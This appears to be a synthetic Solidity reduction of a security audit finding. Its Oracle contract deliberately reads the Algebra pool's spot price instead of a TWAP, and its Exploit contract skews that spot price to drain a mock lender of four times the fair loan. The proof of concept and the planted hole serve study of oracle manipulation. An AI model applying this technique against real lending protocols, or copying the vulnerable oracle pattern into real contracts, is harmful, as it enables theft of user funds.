// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Peapods — V3TwapKimUtilities reads the Algebra spot price
    (Pashov, finding #45983)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _sqrtPriceX96FromPoolAndInterval returns pool.globalState()
    instead of an Algebra timepoint. A same-transaction skew of the spot
    sqrt price from 2^96 (price 1) to 2^97 (price 4) makes a lender value
    10 token0 of collateral at 40 and lend 32 token1. The stored 30-minute
    TWAP is still price 1 and would have lent 8. */

contract ERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Pool {
    uint160 public spot;
    uint160 public twap;

    constructor(uint160 fair) {
        spot = fair;
        twap = fair;
    }

    function globalState() external view returns (uint160, int24, uint16, uint8, uint8, bool) {
        return (spot, 0, 0, 0, 0, true);
    }

    function skew(uint160 next) external {
        spot = next;
    }
}

contract Oracle {
    bool public fixedMode;
    uint160 public lastSqrt;

    constructor(bool fixed_) {
        fixedMode = fixed_;
    }

    function _sqrtPriceX96FromPoolAndInterval(address _poolAddress) external returns (uint160 sqrtPriceX96) {
        Pool pool = Pool(_poolAddress);
        if (fixedMode) {
            // FIX: read the stored timepoint, not the spot that this transaction just wrote
            sqrtPriceX96 = pool.twap();
        } else {
            (sqrtPriceX96,,,,,) = pool.globalState(); // @> VULN: spot sqrt price from globalState
        }
        lastSqrt = sqrtPriceX96;
    }
}

contract Lender {
    ERC20 public token0;
    ERC20 public token1;
    Oracle public oracle;
    Pool public pool;
    uint256 public lastLent;

    constructor(ERC20 a, ERC20 b, Oracle o, Pool p) {
        token0 = a;
        token1 = b;
        oracle = o;
        pool = p;
    }

    function borrow(uint256 collateral) external returns (uint256 lent) {
        token0.transferFrom(msg.sender, address(this), collateral);
        uint160 sqrtP = oracle._sqrtPriceX96FromPoolAndInterval(address(pool));
        uint256 px = _priceE18(sqrtP);
        uint256 value = collateral * px / 1e18;
        lent = value * 80 / 100;
        lastLent = lent;
        token1.transfer(msg.sender, lent);
    }

    function _priceE18(uint160 sqrtPriceX96) internal pure returns (uint256) {
        uint256 s = uint256(sqrtPriceX96);
        uint256 q96 = uint256(1) << 96;
        return s * s * 1e18 / (q96 * q96);
    }
}

contract Exploit {
    uint256 public constant Q96 = uint256(1) << 96;
    ERC20 public token0; // nonce 1
    ERC20 public token1; // nonce 2
    Pool public pool; // nonce 3
    Oracle public oracle; // nonce 4
    Lender public lender; // nonce 5

    constructor() {
        token0 = new ERC20("TKN");
        token1 = new ERC20("DAI");
        pool = new Pool(uint160(Q96));
        oracle = new Oracle(false);
        lender = new Lender(token0, token1, oracle, pool);
        token0.mint(address(this), 10 ether);
        token1.mint(address(lender), 32 ether);
    }

    function run() external {
        pool.skew(uint160(Q96 * 2));
        token0.approve(address(lender), 10 ether);
        uint256 got = lender.borrow(10 ether);
        require(got == 32 ether, "lent 32");
        require(oracle.lastSqrt() == uint160(Q96 * 2), "spot was used");
        require(pool.twap() == uint160(Q96), "twap still fair");
        require(token1.balanceOf(address(this)) == 32 ether, "borrower holds 32");
        require(token1.balanceOf(address(lender)) == 0, "lender drained past the fair 8");
    }
}
